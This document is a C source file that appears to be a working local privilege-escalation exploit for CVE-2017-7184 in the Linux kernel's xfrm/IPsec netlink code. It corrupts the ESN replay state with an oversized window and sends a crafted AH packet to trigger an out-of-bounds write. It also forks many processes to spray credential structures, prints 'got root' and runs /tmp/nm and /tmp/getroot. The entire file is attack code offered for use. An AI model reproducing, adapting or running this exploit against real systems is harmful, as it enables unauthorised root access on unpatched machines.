/*
 * cve-2017-7184
 *
 * need CAP_NET_RAW CAP_NET_ADMIN
 *
 * sudo setcap cap_net_raw,cap_net_admin=eip ./xxx
 * UPDATE:
 *	use htonl to send seq_no
 *	update cred->usage after set it to zero
 */
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/xfrm.h>
#include <linux/netlink.h>
#include <sys/time.h>
#include <sys/resource.h>

struct ip_auth_hdr {
	__u8	nexthdr;
	__u8	hdrlen;
	__be16	reserved;	/* big endian */
	__be32	spi;		/* big endian */
	__be32	seq_no;		/* big endian */
	__u8	auth_data[8];
};

#define MAX_PAYLOAD	2048
#define SPI		0x4149
#define RECV_PORT	13579

int fd_xfrm_state;
int recvfd, sendfd;

int init_fd_xfrm_state(void)
{
	int err;
	struct sockaddr_nl snl;

	memset(&snl, 0, sizeof(snl));
	snl.nl_family = PF_NETLINK;
	snl.nl_pid = getpid();
	snl.nl_groups = 0;

	fd_xfrm_state = socket(PF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (fd_xfrm_state == -1) {
		perror("socket fd_xfrm_state");
		return -1;
	}

	err = bind(fd_xfrm_state, (struct sockaddr *)&snl, sizeof(snl));
	if (err == -1) {
		close(fd_xfrm_state);
		return -1;
	}

	return 0;
}

int alloc_xfrm_state(unsigned int spi, unsigned int orig_bmp_len)
{
	int err;

	struct sockaddr_nl snl;
	memset(&snl, 0, sizeof(snl));
	snl.nl_family = PF_NETLINK;
	snl.nl_pid = 0;			/* send to kernel */
	snl.nl_groups = 0;

	struct msghdr mh;
	struct iovec iov;
	struct nlmsghdr *nlm = malloc(NLMSG_SPACE(MAX_PAYLOAD));
	memset(nlm, 0, NLMSG_SPACE(MAX_PAYLOAD));
	memset(&mh, 0, sizeof(mh));

	/* nlmsghdr */
	nlm->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
	nlm->nlmsg_pid = getpid();
	nlm->nlmsg_flags = NLM_F_REQUEST;
	nlm->nlmsg_type = XFRM_MSG_NEWSA;

	char *p = NULL;
	/* DATA: xfrm_usersa_info structure */
	struct xfrm_usersa_info xui;
	memset(&xui, 0, sizeof(xui));
	xui.family = AF_INET;
	xui.id.proto = IPPROTO_AH;
	xui.id.spi = spi;
	xui.id.daddr.a4 = inet_addr("127.0.0.1");
	xui.lft.hard_byte_limit = 0x10000000;
	xui.lft.hard_packet_limit = 0x10000000;
	xui.lft.soft_byte_limit = 0x1000;
	xui.lft.soft_packet_limit = 0x1000;
	xui.mode = XFRM_MODE_TRANSPORT;
	xui.flags = XFRM_STATE_ESN;
	memcpy(NLMSG_DATA(nlm), &xui, sizeof(xui));
	p = NLMSG_DATA(nlm) + sizeof(xui);

	/* ATTR: xfrm_alg_auth */
	struct nlattr nla;
	struct xfrm_algo xa;
	memset(&nla, 0, sizeof(nla));
	memset(&xa, 0, sizeof(xa));
	nla.nla_len = sizeof(xa) + sizeof(nla);
	nla.nla_type = XFRMA_ALG_AUTH;
	strcpy(xa.alg_name, "digest_null");
	xa.alg_key_len = 0;
	memcpy(p, &nla, sizeof(nla));
	p += sizeof(nla);
	memcpy(p, &xa, sizeof(xa));
	p += sizeof(xa);

	/* ATTR: xfrm_replay_esn_val */
	struct xfrm_replay_state_esn rs;
	char bmp[orig_bmp_len*sizeof(unsigned int)*8];
	memset(&rs, 0, sizeof(rs));
	memset(&nla, 0, sizeof(nla));
	memset(bmp, 'A', orig_bmp_len*sizeof(unsigned int)*8);

	nla.nla_len = sizeof(nla) + sizeof(rs) + orig_bmp_len*sizeof(unsigned int)*8;
	nla.nla_type = XFRMA_REPLAY_ESN_VAL;
	rs.replay_window = orig_bmp_len;
	rs.bmp_len = orig_bmp_len;
	memcpy(p, &nla, sizeof(nla));
	p += sizeof(nla);
	memcpy(p, &rs, sizeof(rs));
	p += sizeof(rs);
	memcpy(p, bmp, orig_bmp_len*sizeof(unsigned int)*8);

	/* prepare to sendmsg */
	iov.iov_base = (void *)nlm;
	iov.iov_len = nlm->nlmsg_len;
	mh.msg_name = (void *)&snl;
	mh.msg_namelen = sizeof(snl);
	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;

	err = sendmsg(fd_xfrm_state, &mh, 0);
	if (err == -1) {
		perror("sendmsg alloc_xfrm_state");
		free(nlm);
		return -1;
	}

	return 0;
}

int update_esn(unsigned int spi, unsigned int orig_bmp_len,
	       unsigned int window, unsigned int seq, unsigned int seq_hi)
{
	struct sockaddr_nl snl;
	memset(&snl, 0, sizeof(snl));
	snl.nl_family = PF_NETLINK;
	snl.nl_pid = 0;
	snl.nl_groups = 0;

	struct nlmsghdr *nlm = malloc(NLMSG_SPACE(MAX_PAYLOAD));
	struct msghdr mh;
	struct iovec iov;

	memset(nlm, 0, NLMSG_SPACE(MAX_PAYLOAD));
	memset(&mh, 0, sizeof(mh));

	nlm->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
	nlm->nlmsg_pid = getpid();
	nlm->nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE;
	nlm->nlmsg_type = XFRM_MSG_NEWAE;

	char *p = NULL;
	/* DATA: xfrm_aevent_id structure */
	struct xfrm_aevent_id xai;
	memset(&xai, 0, sizeof(xai));
	xai.sa_id.proto = IPPROTO_AH;
	xai.sa_id.family = AF_INET;
	xai.sa_id.spi = spi;
	xai.sa_id.daddr.a4 = inet_addr("127.0.0.1");
	memcpy(NLMSG_DATA(nlm), &xai, sizeof(xai));
	p = NLMSG_DATA(nlm) + sizeof(xai);

	/* ATTR: xfrma_replay_esn_val */
	struct nlattr nla;
	struct xfrm_replay_state_esn rs;
	char bmp[orig_bmp_len*sizeof(unsigned int)*8];
	memset(&nla, 0, sizeof(nla));
	memset(&rs, 0, sizeof(rs));
	memset(bmp, 'A', orig_bmp_len*sizeof(unsigned int)*8);

	nla.nla_len = sizeof(nla) + sizeof(rs) + orig_bmp_len*sizeof(unsigned int)*8;
	nla.nla_type = XFRMA_REPLAY_ESN_VAL;
	rs.replay_window = window;
	rs.bmp_len = orig_bmp_len;
	rs.seq_hi = seq_hi;
	rs.seq = seq;

	memcpy(p, &nla, sizeof(nla));
	p += sizeof(nla);
	memcpy(p, &rs, sizeof(rs));
	p += sizeof(rs);
	memcpy(p, bmp, orig_bmp_len*sizeof(unsigned int)*8);

	/* sendmsg */
	iov.iov_base = (void *)nlm;
	iov.iov_len = nlm->nlmsg_len;
	mh.msg_name = (void *)&snl;
	mh.msg_namelen = sizeof(snl);
	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;

	int err = sendmsg(fd_xfrm_state, &mh, 0);
	if (err == -1) {
		perror("sendmsg update_esn");
		free(nlm);
		return -1;
	}

	return 0;
}

int init_recv_fd(void)
{
	recvfd = socket(AF_INET, SOCK_RAW, IPPROTO_AH);
	if (recvfd == -1) {
		perror("socket init_recv_fd");
		return -1;
	}

	struct sockaddr_in sai;
	memset(&sai, 0, sizeof(sai));
	sai.sin_addr.s_addr = inet_addr("127.0.0.1");
	sai.sin_port = htons(RECV_PORT);
	sai.sin_family = AF_INET;

	int err = bind(recvfd, (struct sockaddr *)&sai, sizeof(sai));
	if (err == -1) {
		perror("bind init_recv_fd");
		close(recvfd);
		return -1;
	}

	return 0;
}

int init_send_fd(void)
{
	sendfd = socket(AF_INET, SOCK_RAW, IPPROTO_AH);
	if (sendfd == -1) {
		perror("socket init_send_fd");
		return -1;
	}

	return 0;
}

int trigger_oob(unsigned int spi, unsigned int seq)
{
	struct sockaddr_in sai;
	memset(&sai, 0, sizeof(sai));
	sai.sin_addr.s_addr = inet_addr("127.0.0.1");
	sai.sin_port = htons(RECV_PORT);
	sai.sin_family = AF_INET;

	struct msghdr mh;
	struct iovec iov;
	memset(&mh, 0, sizeof(mh));

	char buf[4096];
	memset(buf, 0x41, sizeof(buf));

	struct ip_auth_hdr iah;
	memset(&iah, 0, sizeof(iah));
	iah.spi = spi;
	iah.nexthdr = 1;
	iah.seq_no = seq;
	iah.hdrlen = (0x10 >> 2) - 2;

	char *p = buf;

	memcpy(p, &iah, sizeof(iah));
	p += sizeof(iah);

	iov.iov_base = buf;
	iov.iov_len = 4096;
	mh.msg_name = (void *)&sai;
	mh.msg_namelen = sizeof(sai);
	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;

	int err = sendmsg(sendfd, &mh, 0);
	if (err == -1) {
		perror("sendmsg sendfd");
		return -1;
	}

	recv(recvfd, buf, 4096, 0);

	return 0;
}

int main(int argc, char *argv[])
{
	int err;
	if (argc != 2) {
		fprintf(stderr, "%s spi\n", argv[0]);
		return -1;
	}
	unsigned int spi = atoi(argv[1]);
	unsigned int orig_bmp_len = 0x24;

	err = init_fd_xfrm_state();
	if (err == -1) {
		fprintf(stderr, "init_fd_xfrm_state err\n");
		return -1;
	}

	err = init_recv_fd();
	if (err == -1) {
		fprintf(stderr, "init_recv_fd err\n");
		return -1;
	}

	err = init_send_fd();
	if (err == -1) {
		fprintf(stderr, "init_send_fd err\n");
		return -1;
	}

	/* set cred structure */
	struct rlimit limit;
	getrlimit(RLIMIT_NPROC, &limit);
	limit.rlim_cur &= ~0xff;

	int i = 0;
	for (i = 0; i < limit.rlim_cur/2; i++) {
		int pid;
		if ((pid = fork()) == 0) {
			usleep(0x1000);
			if (getuid() == 0) {
				fprintf(stderr, "got root\n");
				execl("/tmp/nm", "/tmp/nm", NULL);
			} else
				exit(0);
		}
	}
	usleep(0x1000);
	sleep(3);

	err = alloc_xfrm_state(spi, orig_bmp_len);
	if (err == -1) {
		fprintf(stderr, "alloc_xfrm_state err\n");
		return -1;
	}

	printf("limit: %x\n", limit.rlim_cur);
	for (i = 0; i < limit.rlim_cur/2; i++) {
		int pid;
		if ((pid = fork()) == 0) {
			usleep(1000000);
			if (getuid() == 0) {
				fprintf(stderr, "got root\n");
				execl("/tmp/nm", "/tmp/nm", NULL);
			} else
				exit(0);
		}
	}

	unsigned int window = 0xc01;
	unsigned int seq = 0xb40;
	unsigned int seq_hi = 1;
	err = update_esn(spi, orig_bmp_len, window, seq, seq_hi);
	if (err == -1) {
		fprintf(stderr, "update_esn err\n");
		return -1;
	}

	trigger_oob(spi, htonl(0x1743));
	sleep(9);
	execl("/tmp/getroot", "/tmp/getroot", NULL);

	return 0;
}
